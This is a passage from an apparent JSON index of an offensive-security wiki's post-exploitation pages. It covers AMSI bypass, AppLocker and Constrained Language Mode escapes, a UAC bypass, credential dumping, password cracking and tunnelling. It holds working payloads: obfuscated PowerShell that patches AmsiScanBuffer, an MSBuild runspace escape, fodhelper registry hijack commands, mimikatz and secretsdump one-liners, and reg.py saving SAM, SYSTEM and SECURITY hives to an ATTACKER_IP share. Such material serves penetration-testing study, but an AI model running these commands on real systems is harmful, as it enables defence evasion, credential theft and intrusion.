powershell.exe .\\AmsiHook.dll Note: Not working because AmsiHook.dll is flagged by the AV. Memory Patching Rasta-mouse released an AMSI bypass which patches the AmsiScanBuffer() function in order to return always AMSI_RESULT_CLEAN. https: github.com rasta-mouse AmsiScanBufferBypass Patch: static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; [System.Reflection.Assembly]::LoadFile(\"C:\\Users\\pentestlab\\ASBBypass.dll\") [Amsi]::Bypass() Obfuscating the powershell version of ASBBypass we can succesfully bypass the AMSI. ${_ ==\\_ \\__ ===\\_ } = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA='))) Add-Type ${_ ==\\_ \\__ ===\\_ } ${__ =\\ ==\\ \\_ =\\_ } = [Win32]::LoadLibrary(\"am\" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA')))) ${___ ====\\__ =====} = [Win32]::GetProcAddress(${__ =\\ ==\\ \\_ =\\_ }, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA')))) ${ ==\\_ =\\ \\__ \\ \\ } = 0 [Win32]::VirtualProtect(${___ ====\\__ =====}, [uint32]5, 0x40, [ref]${ ==\\_ =\\ \\__ \\ \\ }) ${_ \\__ =\\ \\___ ==\\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy(${_ \\__ =\\ \\___ ==\\}, 0, ${___ ====\\__ =====}, 6) Force an Error Since there is a signature for the amsiInitFailed flag, an alterantive was discovered which attempt to force an error in order to set in a legitimate way the flag on true. Original Payload: $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem) [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null); Obfuscated Payload: $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType(\"System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31 31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))\").GetField(\"$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118 118))\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31 31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))\").GetField(\"$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))\", \"NonPublic,Static\").SetValue($null, [IntPtr]$fwi); Usage of syscalls opcodes with an stager donut etc… future content Other Tools Shellter Another way to bypass AV is using Shellter"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-bypass-applocker": {
						"id": "post-exploitation-bypass-applocker",
						"title": "Bypass APPLocker",
						"category": "",
						"url": " /post-exploitation/bypass-applocker/",
						"content": "AppLocker AppLocker is a Windows Defender functionallity which helps you control which apps and files users can run. These include executable files, scripts, Windows Installer files, dynamic-link libraries (DLLs), packaged apps, and packaged app installers. AppLocker can help you: Define rules based on file attributes that persist across app updates, such as the publisher name (derived from the digital signature), product name, file name, and file version. You can also create rules based on the file path and hash. Assign a rule to a security group or an individual user. Create exceptions to rules. For example, you can create a rule that allows all users to run all Windows binaries, except the Registry Editor (regedit.exe). Use audit-only mode to deploy the policy and understand its impact before enforcing it. Create rules on a staging server, test them, then export them to your production environment and import them into a Group Policy Object. Simplify creating and managing AppLocker rules by using Windows PowerShell. Check Rules With the cmdlet Get-AppLockerPolicy we can check which rules are enabled on the machine. Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Constrained Language (Powershell) When Applocker is configured on a machine we drop into a Constrained Language Mode (CLM) when we connect using PowerShell Remoting. PowerShell Constrained Language is a language mode of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs. $ExecutionContext.SessionState.LanguageMode PowerShell included an environment variable for debugging and unit testing called __PSLockdownPolicy. Enable PS Constrained Language Mode Enabling constrained language mode, that dows not allow powershell execute complex ataccks such as mimikatz. [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4’, 'Machine') Bypass PS Constrained Language Mode Via GUI However, if you have access to the system and enough privileges to change environment variables, you can bypass it by removing the variable __PSLockdownPolicy and re-spawning another PowerShell instance. [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '8', 'Machine') PowerShell Downgrade If PowerShell 2.0 is installed we can bypass it via spawning a PowerShell 2.0 instance. powershell -version 2 https: www.ired.team offensive-security code-execution powershell-constrained-language-mode-bypass PowerShell Upgrade (PowerShell v6) PowerShell v6.0.0 (pwsh.exe) has only Script Block Logging and AMSI, so we can bypass Constrained Language using PSv6. pwsh.exe Unmanaged PowerShell Runspace We can create a C# assembly that runs powershell on a FullLanguage mode. &lt;Project ToolsVersion=\"4.0\" xmlns=\"http: schemas.microsoft.com developer msbuild 2003\"&gt; &lt;Target Name=\"MSBuild\"&gt; &lt;MSBuildTest &gt; &lt; Target&gt; &lt;UsingTask TaskName=\"MSBuildTest\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt; &lt;Task&gt; &lt;Reference Include=\"System.Management.Automation\" &gt; &lt;Code Type=\"Class\" Language=\"cs\"&gt; &lt;![CDATA[ using System; using System.Linq; using System.Management.Automation; using System.Management.Automation.Runspaces; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class MSBuildTest : Task, ITask { public override bool Execute() { using (var runspace = RunspaceFactory.CreateRunspace()) { runspace.Open(); using (var posh = PowerShell.Create()) { posh.Runspace = runspace; posh.AddScript(\"$ExecutionContext.SessionState.LanguageMode\"); var results = posh.Invoke(); var output = string.Join(Environment.NewLine, results.Select(r =&gt; r.ToString()).ToArray()); Console.WriteLine(output); } } return true; } } ]]&gt; &lt; Code&gt; &lt; Task&gt; &lt; UsingTask&gt; &lt; Project&gt; References https: docs.microsoft.com en-us windows security threat-protection windows-defender-application-control applocker applocker-overview https: devblogs.microsoft.com powershell powershell-constrained-language-mode"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-bypass-uac": {
						"id": "post-exploitation-bypass-uac",
						"title": "Bypass UAC",
						"category": "",
						"url": " /post-exploitation/bypass-uac/",
						"content": "User Account Control (UAC) is an access control system that forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access. UAC was first introduced in Windows Vista and attracted complaints from users due to the frequency and annoyance of the popups, which led Microsoft to introduce some relaxations. Mandatory Levels Exists three types of Mandatory Level: whoami all GROUP INFORMATION ----------------- Group Name Type SID Attributes =================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Low Mandatory Level Unknown SID type S-1-16-4096 Mandatory group, Enabled by default, Enabled group Low Mandatory Level: Services like IE has no permissions, it can not write on any directory, but IE for example need to write cache on a directory. So with Low Mandatory Level we will only able to write data on the following path. C:\\Users\\Victim\\AppData\\LocalLow Medium Mandatory Level: Permissions as a normal user. High Mandatory Level: Permissions as NT AUTHORITY SYSTEM. UAC Bypass Some of the own trusted signed applications are able to “auto-elevate” without consent in certain conditions. The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting. We can check UAC configuration with powershell. $path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" $filter=\"ConsentPromptBehaviorAdmin|ConsentPromptBehaviorUser|EnableInstallerDetection|EnableLUA|EnableVirtualization|PromptOnSecureDesktop|ValidateAdminCodeSignatures|FilterAdministratorToken\" (Get-ItemProperty $path).psobject.properties | where {$_.name -match $filter} | select name,value Name Value ---- ----- ConsentPromptBehaviorAdmin 5 ConsentPromptBehaviorUser 3 EnableInstallerDetection 1 EnableLUA 1 EnableVirtualization 1 PromptOnSecureDesktop 1 ValidateAdminCodeSignatures 0 We are interested in ConsentPromptBehaviorAdmin parameter. Value Meaning 0 Elevate without prompting 1 Prompt for credentials (Secure Desktop) 2 Prompt for consent (Secure Desktop) 3 Prompt for credentials 4 Prompt for consent 5 (Default) Prompt for consent non-windows binaries A UAC bypass is a technique by which an application can go from Medium Integrity to High Integrity without prompting for consent. fodhelper.exe fodhelper.exe is a Microsoft support application responsible for managing language changes in the operating system. This binary runs as high integrity on Windows 10. With sigcheck.exe from SysInternals is posible to inspect the application manifest. sigcheck.exe -a -m C:\\Windows\\System32\\fodhelper.exe Note: Search for requestedExecutionLevel as requireAdministrator and autoElevate in true. First we need to add some registries with REG: REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command v DelegateExecute t REG_SZ REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command d \"cmd.exe\" f"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-get-credentials": {
						"id": "post-exploitation-get-credentials",
						"title": "Gathering Credentials",
						"category": "",
						"url": " /post-exploitation/get-credentials/",
						"content": "After compromising a target is important to recollect the maximum credentials to spray them on the network. Looking for Interesting Files If the target have a web application that use a database try to find the config.php file in order to obtain the database connection. Look what type of applications are installed and look for config files in order to find new pair of creds. Secretsdump secretsdump is a python script from impacket that retrieves secrets such as mimikatz in a remote way. impacket-secretsdump corp Administrador:'passw0rd'@10.10.10.10 Mimikatz It can be user to dump credentials,cached logon credentials, SAM, System, LSASS, VAULT, tuickets and more… To dump those credentials admin privs are needed. .\\mimikatz.exe privilege::debug sekurlsa::logonpasswords full sekurlsa::wdigest sekurlsa::credman sekurlsa::ekeys lsadump::sam lsadump::lsa patch vault::cred patch vault::list ts::mstsc ts::sessions Or we can do a One-Line command: .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords full\" \"sekurlsa::wdigest\" \"sekurlsa::credman\" \"lsadump::sam\" \"vault::cred\" \"vault::list\" \"ts::mstsc\" \"exit\" Note: if sekurlsa::logoncredentials does not work in Windows 10 or Server 2019 download a older realease. mimikatz.exe v 2.1.1 Invoke-Mimikatz The script is userful to execute mimikatz with PowerShell without droppin the mimikatz exe to disk. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script. Like mimikatz.exe the script needs administrative privileges for dumping credentials from local machine. https: github.com PowerShellMafia PowerSploit blob master Exfiltration Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds We can also dump credentials on multiple remote machines. Invoke-Mimikatz -DumCreds -ComputerName @(\"machine01\",\"machine02\") Invoke-Mimikatz gives us the oportunity to excute differents attacks. Examples of Attacks: DCSync is more silent: Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\Administrator\"' Overpass the Hash: Invoke-Mimikatz -Command '\"sekurlsa::pth usr:Administrator domain:corp.local ntlm:&lt;ntlmhash&gt; run:powershell.exe\"' Crafting a golden ticket: Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:512 startoffset:0 endin:600 renewmax:10080 ptt\"' Hijacking RDP Session To hijack a RDP session we need mimikatz. .\\mimikatz.exe privilege::debug ts::sessions ts::mstsc token::elevate ts::remote id:3 SAM and LSA Secrets (Windows) In Windows environments, passwords are stored hashed in resgistriy hives. Hive Details Format SAM Stores locally cached credentials LM or NT hashes SECURITY Stores domain cached credentials (LSA secrets) Plaintext, LM or NT hashes,Kerberos Keys (DES, AES), Domain Cached Credential (DCC1 and DCC2) SYSTEM Contain enough info to decrypt SAM and LSA secrets N A You can easily dump the SAM , SECURITY and SYSTEM registries hives with different tools, from linux and windows: Impacket With impacket-reg.py can dump the SAM and LSA secrets remotely. impacket-smbserver share . -smb2support impacket-reg DOMAIN user:pass@IP save -keyName 'HKLM\\SAM' -o \\\\SMBIP\\share impacket-reg DOMAIN user:pass@IP save -keyName 'HKLM\\SYSTEM' -o \\\\SMBIP\\share impacket-reg DOMAIN user:pass@IP save -keyName 'HKLM\\SECURITY' -o \\\\SMBIP\\share Reg.exe When the windows operating system is running, the hives are in use and mounted, so we can not directly copy the file. So we need to export them with reg.exe. reg save HKLM\\SAM c:\\Windows\\Temp\\sam.save reg save HKLM\\SYSTEM c:\\Windows\\Temp\\system.save reg save HKLM\\SECURITY c:\\Windows\\Temp\\security.save You can also dump it remotely: reg.py \"domain\" \"user\":\"password\"@\"target\" save -keyName 'HKLM\\SAM' -o '\\\\ATTACKER_IPs\\someshare' reg.py \"domain\" \"user\":\"password\"@\"target\" save -keyName 'HKLM\\SYSTEM' -o '\\\\ATTACKER_IP\\someshare' reg.py \"domain\" \"user\":\"password\"@\"target\" save -keyName 'HKLM\\SECURITY' -o '\\\\ATTACKER_IP\\someshare' Finally on our kali we just need to use sam2dump or impacket-secretsdump to get the hashes. samdump2 system.save sam.save &gt; hashes.txt impacket-secretsdump -sam . sam.save -system . system.save -security . security.save LOCAL CrackMapExec With crackmapexec we can dump it remotely like imapecket-reg: crackmapexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam --lsa crackmapexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam --lsa crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam --lsa crackmapexec smb $TARGETS --kerberos --sam --lsa Mimikatz mimikatz is a powerfull post-exploitation tool, with mimikatz we can extract all secrets included SAM and LSA: token::privilege lsadump::sam lsadump::sam sam:'C:\\Windows\\Temp\\sam.save' system:'C:\\Windows\\Temp\\system.save' lsadump::secrets lsadump::secrets security:'C:\\Windows\\Temp\\security.save' system:'C:\\Windows\\Temp\\system.save' PASSWD and SHADOW (Lin) Same as Windows, when we pwn a privilege user such as root we can get system users and passwords. In linux we just need to copy the following files to our attacking machine. etc passwd etc shadow Finally on our kali machine we just need to use unshadow to get the hashes: unshadow passwd shadow &gt; hashes.txt Mozilla Firefox Thunderbird WaterFox SeaMonkey Some users victims uses Mozilla Firefox or Mozilla Thunderbird and stores their credentials without protection. On windows search the following route: C:\\Users\\VICTIM\\AppData\\Roaming Zip the content of Firefox or Thunderbird folder and transfer it to the attacking machine. Once transferred we are going to use firefox-decrypt tool to get the plaintext credentials. $ python firefox_decrypt.py folder containing profiles.ini Master Password for profile tmp Thunderbird Profiles s68bba5j.default: 2021-09-21 19:55:06,811 - WARNING - Attempting decryption with no Master Password Website: mailbox: test.local Username: 'eric' Password: 'sup3rs3cr3t' Website: smtp: test.local Username: 'eric' Password: 'sup3rs3cr3t' https: github.com unode firefox_decrypt Google Chrome Chrome sotres DPAPI protected credentials in a local SQLite database, which can be found on windows machines on AppData directory. C:\\&gt; ls C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default Size Type Last Modified Name ---- ---- ------------- ---- 40kb fil 02 25 2021 13:21:18 Login Data SharpChromium is a good tool to decrypt these stored credentials. https: github.com djhohnstein SharpChromium C:\\&gt; .\\SharpChromium.exe logins [*] Beginning Google Chrome extraction. --- Chromium Credential (User: user) --- URL : Username : user Password : Passw0rd! [*] Finished Google Chrome extraction. [*] Done."
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-password-cracking": {
						"id": "post-exploitation-password-cracking",
						"title": "Password Cracking",
						"category": "",
						"url": " /post-exploitation/password-cracking/",
						"content": "Cryptography is a method of protecting information and communications through the use of codes, so that only those for whom the information is intended can read and process it. Hashing Introduction A hash is a function that converts one value to another. Hashing data is a common practice in computer science and is used for several different purposes. Examples include cryptography, compression, checksum generation, and data indexing. Hashing is a natural fit for cryptography because it masks the original data with another value. A hash function can be used to generate a value that can only be decoded by looking up the value from a hash table. The table may be an array, database, or other data structure. A good cryptographic hash function is non-invertible, meaning it cannot be reverse engineered. Password Cracking Attacks In cryptanalysis and computer security, password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system. Hashcat is one of the most powerful password cracking tools at the moment. First we need to fount which type of hash we are trying to crack, this guide contains all hash types that hashcat supports. hashcat -a 0 -m mode passwd.hash wordlist Caution: In order to avoid false positives or false negatives never use –force parameter. Or you can use Google Colab to crack the hashes: https: github.com mxrch penglab Rainbow Tables A rainbow table works by doing a cryptanalysis very quickly and effectively. Unlike bruteforce attack, which works by calculating the hash function of every string present with them, calculating their hash value and then compare it with the one in the computer, at every step. A rainbow table attack eliminates this need by already computing hashes of the large set of available strings. There are some online resources where has a rainbow table pre calculated for some hash types. https: crackstation.net https: www.md5online.org md5-decrypt.html https: md5.gromweb.com Note: Some modern hashes such as bcrypt make use of salt, which prevents Rainbow Tables attacks. Dictionary Attack In cryptanalysis and computer security, a dictionary attack is an attack using a restricted subset of a keyspace to defeat a cipher or authentication mechanism by trying to determine its decryption key or passphrase, sometimes trying thousands or millions of likely possibilities often obtained from lists of past security breaches. Te most common dictionaries used for password cracking: Rockyou: https: github.com brannondorsey naive-hashcat releases download data rockyou.txt Kaonashi: https: github.com kaonashi-passwords Kaonashi SecLists: https: github.com danielmiessler SecLists hashcat -a 0 -m mode passwd.hash wordlist Note: Hashcat -a 0 parameter is used to perform a dictionary attack. Rules Typical password-enforcement rules are collected in some dictionaries, these types of rules generally require the use of upper and olwe-case characters, numbers and special characters. hashcat -a 0 -m mode passwd.hash -r rules wordlist Note: Hashcat rules are located in usr share hashcat rules Selecting a correct Wordlist We can use common wordlists like rockyou.txt or some from SecLists, but also we can create a custom one. Cewl Cewl gives us the opportunity to browse the website and manually add commonly-used termns and product names to our custom wordlists. Also we can select the minimum length of the passwords wit -m parameter. cewl www.example.com -m 6 -2 wordlist.out kwprocessor Kwprocessor is an external utility from hashcat that generates key-walk passwords, which are based on adjacent keys. Has three main componentes, the base characters which are the alphabet of the target language, the keyboard layout and the routes (directions to walk in). https: github.com hashcat kwprocessor kwp64.exe basechars\\custom.base keymaps\\es.keymap routes\\2-to-10-max-3-direction-changes.route -o .\\keywalk.txt Note: Some candidates could be generated multiples times. Combinator Attack The combinator attack combines the entries from two dictionaries into single-words. We can also aply a rule to each word on the left or right using the options -j and -k. hashcat -a 1 -m mode hash wordlist1 wordlist2 -j $- -k $! Note: Hashcat -a 1 parameter is used to perform a combinator attack. Mask Attack Mask attacks are similar to brute-force attacks given they try all combinations from a set of characters. With brute-force attacks, all possible characters that exist are tried. Mask attacks are more specific as the set of characters you try is reduced based on information you know. Note: Hashcat -a 3 parameter is used to perform a mask attack. Hashcat Parameters Built-in charsets: ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?s = !\"#$%&amp;'()*+,-. :;&lt;=&gt;?@[\\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 - 0xff Custom charsets: -1, --custom-charset1=CS User-defined charsets -2, --custom-charset2=CS Example: -3, --custom-charset3=CS --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef -4, --custom-charset4=CS -2 mycharset.hcchr : sets charset ?2 to chars contained in file Example: -1 ?u -2 ?u?l?d -3 ?d We can also use static strings as part of a mask. Company?d Running the Attack After running the command, the attack will start and you should get output similar to the following: hashcat -a 3 -m mode -1 ?u -2 -?l?u?d -3 ?d hash ?1?2?2?2?3?3?3 We can use the --increment parameter to go trhough all combinations and no only try passwords of the same length: ?1 ?1?2 ?1?2?2 ?1?2?2?2 ?1?2?2?2?3 ?1?2?2?2?3?3 ?1?2?2?2?3?3?3 Command: hashcat -a 3 -m mode -1 ?u -2 -?l?u?d -3 ?d --increment hash ?1?2?2?2?3?3?3 Mask Files We can create a file with different masks. Note: We can specify custom chars at the beginning of the line with , as a separator. ?d?s,?u?l?l?l?l?1 ?d?s,?u?l?l?l?l?l?1 ?d?s,?u?l?l?l?l?l?l?1 ?d?s,?u?l?l?l?l?l?l?l?1 ?d?s,?u?l?l?l?l?l?l?l?l?1 And finally run it: hashcat -a 3 -m mode hash mask.hcmask Hybrid Attack The hybrid attack is a combination of wordlists and mask attack. Note: Hashcat -a 6 parameter is used to perform a hybrid attack where first come the wordlist and after the mask mode. hashcat -a 6 -m mode hash wordlist ?d?d?d?d # Password5555 Note: Hashcat -a 7 parameter it is also used for hybrid attacks but first comes the mask and after that the wordlists. hashcat -a 7 -m mode hash ?d?d?d?d wordlist # 5555Password Encryption Introduction The two main categories of Encryption are symmetric and asymmetric. Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long). Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys. Cracking SSH private key After getting the private ssh key protected with a passphrase, in order to obtain this passphrase we will need to convert that ssh key to john format, for that run ssh2john script: python ssh2john id_rsa &gt; id_rsa.hash And crack it with your fav list: john id_rsa.hash -wordlist=[wordlist] Cracking KDBX (KeePass Files) First we need to convert our file to a hash. python keepass2john file.kdbx &gt; kdbx.hash And crack it with your fav list: john kdbx.hash -wordlist=[wordlist] hashcat -a 0 -m 13400 kdbx.hash [wordlist] Decrypting openssl enc data with salted password When we found some file like that: ❯ file file.enc file.enc: openssl enc'd data with salted password We can crack the password with bruteforce-salted-openssl specifying the digest and cipher (AES-256-CBC by default). bruteforce-salted-openssl -t 50 -f rockyou.txt -d &lt;digest&gt; file.enc -1 Finally we need to decrypt the file with the key obtained while bruteforcing. openssl aes-256-cbc -d -in file.enc -out file.txt -k &lt;KEY&gt; Ciphers Detection There are many online tools that helps to detect which type of cipher is applied based on entropy. https: www.boxentriq.com code-breaking cipher-identifier Also there are a lot of online tools to decode or encode with different ciphers: https: www.dcode.fr https: gchq.github.io CyberChef Note: quipqiup is a powerfull tool that solves simple subsitution ciphers. https: quipqiup.com References: https: techterms.com definition hash https: www.abhizer.com crack-ssh-with-john https: www.geeksforgeeks.org understanding-rainbow-table-attack https: www.4armed.com blog perform-mask-attack-hashcat"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-port-forwarding": {
						"id": "post-exploitation-port-forwarding",
						"title": "Port Forwarding and Tunneling",
						"category": "",
						"url": " /post-exploitation/port-forwarding/",
						"content": "Introduction In computer networking, port forwarding or port mapping is an application of network address translation that redirects a communication request from one address and port number combination to another. Simple Port Forwarding or Tunneling SSH Port Forwarding Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side. SSH Local Port Forwarding -L is a local tunnel (YOU –&gt; CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if test was blocked at work, you can do the next command. Going to localhost:9000 on your machine, will load test traffic using your other server. root@kali:~$ ssh -N -L 900:test.com:80 user@example.com SSH Remote Port Forwarding -R is a remote tunnel (YOU &lt;– CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse. Sometimes the ssh server is off and you need to ssh back to your attacking machine in order to forward a traffic port. user@target:~$ ssh -N -R example.com:80:test.com:80 user@example.com SSH Dynamic Port Forwarding This is the coolest one because uses SOCKS4 proxy and redirects all traffic sent via proxy to the target machine, which would be similar like launching our scripts from the target machine. First we need to configure proxychains. sudo echo \"socks4 5566\" &gt;&gt; etc proxychains.conf Create the dynamic tunnel with the specified port. ssh -N -D 5566 user@example.com After that all commands that begins with proxychains will be sent through the proxy. sudo proxychains nmap -sV -sC 10.10.10.10 SSH Reverse Dynamic Port Forwarding If the host is not specified ssh creates a socks4 tunnel. So if there are no ssh service on the target machine we can also create a tunnel. ssh -N -R 5566 kali@kali If it’s not possible to setup a tty, because the target machine does not have python installed, we would not be able to put the password on the prompt. So instead of that we will use a pair of keys. ssh-keygen ssh -N -R 5566 -i ~ .ssh id_rsa -o \"UserKnownHostsFile= dev null\" -o \"StrictHostKeyChecking=no\" kali@kali Remember to add the id_rsa.pub key on the authorized keys. echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDORkdAZlHfTTbMZNPX7VaU3yx9dl3a1RwP4Px4SZWpkE3I95P2X9aAD4TvyiyvrEYzhOMymGulE69pAbXnfjvzFpMfQRUBEjrMqQv+jUL62MhpiVaB8AkO9iay2j90mNxLmrqNRSEuDiVpX2eDGcHKAhLno1uOrMkvvzc3HTVfLy8 ukbVmFGCb8TSA9mvcnjTyBeIA67yC5oPeHQ4GMKQIunrcV8XFj2qX4iTDRrUXyLj2socdCVwZAymJzTPbLEY 1oSRw6JkaR+iszQXKl+J9PR6Ev01EkmMPac5iRmtS9+6hXzKV40t6F5gBJGXvFA1qQwfydHLt8noUTYXuYymAx7MW+fO7blrjVVfbHGag03qz1xlQPcaG CtQeV94YWJI47Cj91j6t+iZhj4ntwbgYcrOl3nm 7hpJdrXdOdxFeuEtbUmxdO7ljXsr7q9hKLHONtFVII5+ej8gBvw0N0MtJRnVCIAcjizNCz8gtBsxIVKSV9pxxvagSKeIoKus= mysql@target' &gt; authorized_keys Chisel Chisel is a fast TCP UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Available on Windows and Linux https: github.com jpillora chisel Note: Download a Release Server Start the Chisel server on your attacker machine specifying the port to use. . chisel server -p PORT --reverse Client On the target machine, you need to start the Chisel client, specify the server IP and port, and specify the ports to tunneling. . chisel client IP:PORT R:PORT_KALI:localhost:PORT_VICTIM R:PORT2_KALI:localhost:PORT2_VICTIM rinetd rinetd is a port forwarding tool easily configurable and installable. sudo apt-get install rinetd The rinetd configuration file is etc rinetd.conf that lists all forwarding rules. # bindadress bindport connectaddress connectport options... # 0.0.0.0 80 192.168.1.2 80 # ::1 80 192.168.1.2 80 # 